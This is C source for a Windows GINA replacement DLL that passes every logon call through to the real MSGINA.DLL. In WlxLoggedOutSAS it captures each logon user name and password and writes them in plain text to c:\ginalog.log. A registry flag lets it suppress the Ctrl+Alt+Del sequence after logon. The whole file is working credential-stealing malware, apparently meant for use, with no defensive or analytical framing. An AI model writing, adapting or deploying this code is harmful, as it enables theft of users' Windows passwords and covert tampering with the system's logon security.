
#define _WIN32_WINNT 0x0400
#include <stdafx.h>
#include <stdio.h>
#include <stdlib.h>
#include "winwlx.h"

//
// function prototypes for the gina interface
//

typedef BOOL (WINAPI *PGWLXNEGOTIATE)( DWORD, DWORD* );
typedef BOOL (WINAPI *PGWLXINITIALIZE)( LPWSTR, HANDLE, PVOID, PVOID, PVOID* );
typedef VOID (WINAPI *PGWLXDISPLAYSASNOTICE)( PVOID );
typedef int  (WINAPI *PGWLXLOGGEDOUTSAS)( PVOID, DWORD, PLUID, PSID, PDWORD,
                                        PHANDLE, PWLX_MPR_NOTIFY_INFO, PVOID *);
typedef BOOL (WINAPI *PGWLXACTIVATEUSERSHELL)(  PVOID, PWSTR, PWSTR, PVOID );
typedef int  (WINAPI *PGWLXLOGGEDONSAS)( PVOID, DWORD, PVOID );
typedef VOID (WINAPI *PGWLXDISPLAYLOCKEDNOTICE)( PVOID );
typedef int  (WINAPI *PGWLXWKSTALOCKEDSAS)( PVOID, DWORD );
typedef BOOL (WINAPI *PGWLXISLOCKOK)( PVOID );
typedef BOOL (WINAPI *PGWLXISLOGOFFOK)( PVOID );
typedef VOID (WINAPI *PGWLXLOGOFF)( PVOID );
typedef VOID (WINAPI *PGWLXSHUTDOWN)( PVOID, DWORD );

//
// NEW for version 1.1
//
typedef BOOL (WINAPI *PGWLXSCREENSAVERNOTIFY)( PVOID, BOOL * );
typedef BOOL (WINAPI *PGWLXSTARTAPPLICATION)( PVOID, PWSTR, PVOID, PWSTR );

// New for version 1.3
//

typedef BOOL (WINAPI * PGWLXNETWORKPROVIDERLOAD) (PVOID, PWLX_MPR_NOTIFY_INFO);
typedef BOOL (WINAPI * PGWLXDISPLAYSTATUSMESSAGE) (PVOID, HDESK, DWORD, PWSTR, PWSTR);
typedef BOOL (WINAPI * PGWLXGETSTATUSMESSAGE) (PVOID, DWORD *, PWSTR, DWORD);
typedef BOOL (WINAPI * PGWLXREMOVESTATUSMESSAGE) (PVOID);


// New for 1.4
//
typedef BOOL (WINAPI * PGWLXGETCONSOLESWITCHCREDENTIALS)(PVOID ,PVOID);
typedef VOID (WINAPI * PGWLXRECONNECTNOTIFY)(PVOID);
typedef VOID (WINAPI * PGWLXDISCONNECTNOTIFY)(PVOID);


void WriteLog(char *fmt,...)
{
	FILE *fp;
	va_list args;
	//char temp[256];

	if((fp =fopen("c:\\ginalog.log", "a")) !=NULL)
	{		
		va_start(args,fmt);

		vfprintf(fp, fmt, args);
		fprintf(fp, "\n");
		fclose(fp);
		
		va_end(args);
	}
}

// Location of the real msgina.
//
TCHAR   szPath[] = TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

PWSTR
DupString(
    PWSTR   pszText)
{
    PWSTR   New;
    DWORD   cb;

    cb = (wcslen(pszText) + 1) * sizeof(WCHAR);
    New = (PWSTR)LocalAlloc(LMEM_FIXED, cb);

    if (New)
    {
        wcscpy(New, pszText);
    }

    return(New);
}

PWLX_DISPATCH_VERSION_1_1   pWlxFuncs;      // Ptr to table of functions
HINSTANCE                   hDllInstance;   // My instance, for resource loading

#define REALGINA_PATH   TEXT("MSGINA.DLL")


//
// winlogon function dispatch table
//

PWLX_DISPATCH_VERSION_1_0 g_pWinlogon;

//
// Functions pointers to the real msgina which we will call.
//

PGWLXNEGOTIATE GWlxNegotiate;
PGWLXINITIALIZE GWlxInitialize;
PGWLXDISPLAYSASNOTICE GWlxDisplaySASNotice;
PGWLXLOGGEDOUTSAS GWlxLoggedOutSAS;
PGWLXACTIVATEUSERSHELL GWlxActivateUserShell;
PGWLXLOGGEDONSAS GWlxLoggedOnSAS;
PGWLXDISPLAYLOCKEDNOTICE GWlxDisplayLockedNotice;
PGWLXWKSTALOCKEDSAS GWlxWkstaLockedSAS;
PGWLXISLOCKOK GWlxIsLockOk;
PGWLXISLOGOFFOK GWlxIsLogoffOk;
PGWLXLOGOFF GWlxLogoff;
PGWLXSHUTDOWN GWlxShutdown;

HANDLE      hGinaWlx;

//
// NEW for version 1.1
//

PGWLXSTARTAPPLICATION GWlxStartApplication;
PGWLXSCREENSAVERNOTIFY GWlxScreenSaverNotify;

//
// New for version 1.2 - No new GINA interface was added, except
//                       a new function in the dispatch table.
//

//
// New for version 1.3
//

PGWLXNETWORKPROVIDERLOAD   GWlxNetworkProviderLoad;
PGWLXDISPLAYSTATUSMESSAGE  GWlxDisplayStatusMessage;
PGWLXGETSTATUSMESSAGE      GWlxGetStatusMessage;
PGWLXREMOVESTATUSMESSAGE   GWlxRemoveStatusMessage;
//
// New for 1.4
//

PGWLXGETCONSOLESWITCHCREDENTIALS	GWlxGetConsoleSwitchCredentials;
PGWLXRECONNECTNOTIFY				GWlxReconnectNotify;
PGWLXDISCONNECTNOTIFY				GWlxDisconnectNotify;

//
// hook into the real GINA.
//

BOOL
MyInitialize( void )
{
    HINSTANCE hDll;

    //
    // Load MSGINA.DLL.
    //
    if( !(hDll = LoadLibrary( REALGINA_PATH )) ) {
        return FALSE;
    }

    //
    // Get pointers to all of the WLX functions in the real MSGINA.
    //
    GWlxNegotiate = (PGWLXNEGOTIATE)GetProcAddress( hDll, "WlxNegotiate" );
    if( !GWlxNegotiate ) {
        return FALSE;
    }

    GWlxInitialize = (PGWLXINITIALIZE)GetProcAddress( hDll, "WlxInitialize" );
    if( !GWlxInitialize ) {
        return FALSE;
    }

    GWlxDisplaySASNotice =
        (PGWLXDISPLAYSASNOTICE)GetProcAddress( hDll, "WlxDisplaySASNotice" );
    if( !GWlxDisplaySASNotice ) {
        return FALSE;
    }

    GWlxLoggedOutSAS =
        (PGWLXLOGGEDOUTSAS)GetProcAddress( hDll, "WlxLoggedOutSAS" );
    if( !GWlxLoggedOutSAS ) {
        return FALSE;
    }

    GWlxActivateUserShell =
        (PGWLXACTIVATEUSERSHELL)GetProcAddress( hDll, "WlxActivateUserShell" );
    if( !GWlxActivateUserShell ) {
        return FALSE;
    }

    GWlxLoggedOnSAS =
        (PGWLXLOGGEDONSAS)GetProcAddress( hDll, "WlxLoggedOnSAS" );
    if( !GWlxLoggedOnSAS ) {
        return FALSE;
    }

    GWlxDisplayLockedNotice =
        (PGWLXDISPLAYLOCKEDNOTICE)GetProcAddress(
                                        hDll,
                                        "WlxDisplayLockedNotice" );
    if( !GWlxDisplayLockedNotice ) {
        return FALSE;
    }

    GWlxIsLockOk = (PGWLXISLOCKOK)GetProcAddress( hDll, "WlxIsLockOk" );
    if( !GWlxIsLockOk ) {
        return FALSE;
    }

    GWlxWkstaLockedSAS =
        (PGWLXWKSTALOCKEDSAS)GetProcAddress( hDll, "WlxWkstaLockedSAS" );
    if( !GWlxWkstaLockedSAS ) {
        return FALSE;
    }

    GWlxIsLogoffOk = (PGWLXISLOGOFFOK)GetProcAddress( hDll, "WlxIsLogoffOk" );
    if( !GWlxIsLogoffOk ) {
        return FALSE;
    }

    GWlxLogoff = (PGWLXLOGOFF)GetProcAddress( hDll, "WlxLogoff" );
    if( !GWlxLogoff ) {
        return FALSE;
    }

    GWlxShutdown = (PGWLXSHUTDOWN)GetProcAddress( hDll, "WlxShutdown" );
    if( !GWlxShutdown ) {
        return FALSE;
    }

    //
    // we don't check for failure here because these don't exist for
    // gina's implemented prior to Windows NT 4.0
    //

    GWlxStartApplication = (PGWLXSTARTAPPLICATION) GetProcAddress( hDll, "WlxStartApplication" );
    GWlxScreenSaverNotify = (PGWLXSCREENSAVERNOTIFY) GetProcAddress( hDll, "WlxScreenSaverNotify" );

	GWlxNetworkProviderLoad = (PGWLXNETWORKPROVIDERLOAD) GetProcAddress( hDll, "WlxNetworkProviderLoad" );
	GWlxDisplayStatusMessage = (PGWLXDISPLAYSTATUSMESSAGE) GetProcAddress( hDll, "WlxDisplayStatusMessage" );
	GWlxGetStatusMessage = (PGWLXGETSTATUSMESSAGE) GetProcAddress( hDll, "WlxGetStatusMessage" );
	GWlxRemoveStatusMessage = (PGWLXREMOVESTATUSMESSAGE) GetProcAddress( hDll, "WlxRemoveStatusMessage" );

    
	GWlxGetConsoleSwitchCredentials = (PGWLXGETCONSOLESWITCHCREDENTIALS) GetProcAddress( hDll, "WlxGetConsoleSwitchCredentials" );
	GWlxReconnectNotify = (PGWLXRECONNECTNOTIFY)GetProcAddress( hDll, "WlxReconnectNotify" );
	GWlxDisconnectNotify = (PGWLXDISCONNECTNOTIFY)GetProcAddress( hDll, "WlxDisconnectNotify" );
	//
    // Everything loaded ok.  Return success.
    //
    return TRUE;
}


BOOL
WINAPI
WlxNegotiate(
    DWORD       dwWinlogonVersion,
    DWORD       *pdwDllVersion)
{
    if( !MyInitialize() )
        return FALSE;

    return GWlxNegotiate( dwWinlogonVersion, pdwDllVersion );
}


BOOL
WINAPI
WlxInitialize(
    LPWSTR      lpWinsta,
    HANDLE      hWlx,
    PVOID       pvReserved,
    PVOID       pWinlogonFunctions,
    PVOID       *pWlxContext)
{
    pWlxFuncs = (PWLX_DISPATCH_VERSION_1_1) pWinlogonFunctions;
	hGinaWlx = hWlx;
    return GWlxInitialize(
                lpWinsta,
                hWlx,
                pvReserved,
                pWinlogonFunctions,
                pWlxContext
                );
}


VOID
WINAPI
WlxDisplaySASNotice(
    PVOID   pWlxContext)
{
    GWlxDisplaySASNotice( pWlxContext );
}


int
WINAPI
WlxLoggedOutSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType,
    PLUID           pAuthenticationId,
    PSID            pLogonSid,
    PDWORD          pdwOptions,
    PHANDLE         phToken,
    PWLX_MPR_NOTIFY_INFO    pMprNotifyInfo,
    PVOID           *pProfile)
{
    int iRet;
    iRet = GWlxLoggedOutSAS(
                pWlxContext,
                dwSasType,
                pAuthenticationId,
                pLogonSid,
                pdwOptions,
                phToken,
                pMprNotifyInfo,
                pProfile);


    if(iRet == WLX_SAS_ACTION_LOGON) {
        //
        // copy pMprNotifyInfo and pLogonSid for later use
        //

        // pMprNotifyInfo->pszUserName
        // pMprNotifyInfo->pszDomain
        // pMprNotifyInfo->pszPassword
        // pMprNotifyInfo->pszOldPassword

// I CAN GET THE PASSWORD !	
		char userName[100];
		ZeroMemory(userName,100);
		char userPass[100];
		ZeroMemory(userPass,100);
		wcstombs(userName,pMprNotifyInfo->pszUserName,sizeof(pMprNotifyInfo->pszUserName));
		wcstombs(userPass,pMprNotifyInfo->pszPassword,sizeof(pMprNotifyInfo->pszPassword));
		WriteLog("NAME = %s  PASSWORD = %s ", userName,userPass);
    }

    return iRet;
}


BOOL
WINAPI
WlxActivateUserShell(
    PVOID           pWlxContext,
    PWSTR           pszDesktopName,
    PWSTR           pszMprLogonScript,
    PVOID           pEnvironment)
{
    return GWlxActivateUserShell(
                pWlxContext,
                pszDesktopName,
                pszMprLogonScript,
                pEnvironment
                );
}


int
WINAPI
WlxLoggedOnSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType,
    PVOID           pReserved)
{

    HKEY        hKey;
    DWORD       dwValue=1;
    DWORD       dwSize;
    DWORD       dwType;
    if (!RegOpenKey(HKEY_LOCAL_MACHINE,szPath,&hKey))
    {
        dwSize = sizeof(DWORD);
        RegQueryValueEx(hKey, TEXT("SAS_S"), 0, &dwType, (PBYTE) &dwValue, &dwSize);
        RegCloseKey(hKey);
    }
	if(dwValue)
		return WLX_SAS_ACTION_NONE;
	else
		return GWlxLoggedOnSAS( pWlxContext, dwSasType, pReserved );
}

VOID
WINAPI
WlxDisplayLockedNotice(
    PVOID           pWlxContext )
{
    GWlxDisplayLockedNotice( pWlxContext );
}


BOOL
WINAPI
WlxIsLockOk(
    PVOID           pWlxContext)
{
    return GWlxIsLockOk( pWlxContext );
}


int
WINAPI
WlxWkstaLockedSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType )
{
    return GWlxWkstaLockedSAS( pWlxContext, dwSasType );
}

BOOL
WINAPI
WlxIsLogoffOk(
    PVOID pWlxContext
    )
{
    BOOL bSuccess;

    bSuccess = GWlxIsLogoffOk( pWlxContext );

    if(bSuccess) {

        //
        // if it's ok to logoff, finish with the stored credentials
        // and scrub the buffers
        //

    }

    return bSuccess;
}


VOID
WINAPI
WlxLogoff(
    PVOID pWlxContext
    )
{
    GWlxLogoff( pWlxContext );
}


VOID
WINAPI
WlxShutdown(
    PVOID pWlxContext,
    DWORD ShutdownType
    )
{
    GWlxShutdown( pWlxContext, ShutdownType );
}


//
// NEW for version 1.1
//

BOOL
WINAPI
WlxScreenSaverNotify(
    PVOID                   pWlxContext,
    BOOL *                  pSecure
    )
{
    if(GWlxScreenSaverNotify != NULL)
		return GWlxScreenSaverNotify( pWlxContext, pSecure );

    //
    // if not exported, return something intelligent
    //

    *pSecure = TRUE;

    return TRUE;
}

BOOL
WINAPI
WlxStartApplication(
    PVOID                   pWlxContext,
    PWSTR                   pszDesktopName,
    PVOID                   pEnvironment,
    PWSTR                   pszCmdLine
    )
{
    if(GWlxStartApplication != NULL)
        return GWlxStartApplication(
            pWlxContext,
            pszDesktopName,
            pEnvironment,
            pszCmdLine
            );

    //
    // if not exported, return something intelligent
    //
	return 0;

}

//
// New for version 1.3
//

BOOL
WINAPI
WlxNetworkProviderLoad (PVOID                pWlxContext,
                        PWLX_MPR_NOTIFY_INFO pNprNotifyInfo)
{
    if(GWlxNetworkProviderLoad!= NULL)
		return GWlxNetworkProviderLoad(pWlxContext, pNprNotifyInfo);
	return 0;
}


BOOL
WINAPI
WlxDisplayStatusMessage (PVOID pWlxContext,
                         HDESK hDesktop,
                         DWORD dwOptions,
                         PWSTR pTitle,
                         PWSTR pMessage)
{
	if(GWlxDisplayStatusMessage!=NULL)
		return GWlxDisplayStatusMessage(pWlxContext,
									hDesktop,
									dwOptions,
									pTitle,
									pMessage);
	return 0;
}


BOOL
WINAPI
WlxGetStatusMessage (PVOID   pWlxContext,
                     DWORD * pdwOptions,
                     PWSTR   pMessage,
                     DWORD   dwBufferSize)
{
	if(GWlxGetStatusMessage!=NULL)
		return GWlxGetStatusMessage(pWlxContext,
								pdwOptions,
								pMessage,
								dwBufferSize);
	return 0;
}


BOOL
WINAPI
WlxRemoveStatusMessage (PVOID pWlxContext)
{
	if(GWlxRemoveStatusMessage!=NULL)
		return GWlxRemoveStatusMessage(pWlxContext);
	return 0;
}


//
// New for 1.4
//
BOOL
WINAPI
WlxGetConsoleSwitchCredentials (PVOID pWlxContext,PVOID pCredInfo)
{
	if(GWlxGetConsoleSwitchCredentials!=NULL)
		return GWlxGetConsoleSwitchCredentials(pWlxContext,pCredInfo);
	return 0;
}

VOID
WINAPI
WlxReconnectNotify (PVOID pWlxContext)
{
	if(GWlxReconnectNotify!=NULL)
		GWlxReconnectNotify(pWlxContext);
}

VOID
WINAPI
WlxDisconnectNotify (PVOID pWlxContext)
{
	if(GWlxDisconnectNotify!=NULL)
		GWlxDisconnectNotify(pWlxContext);
}

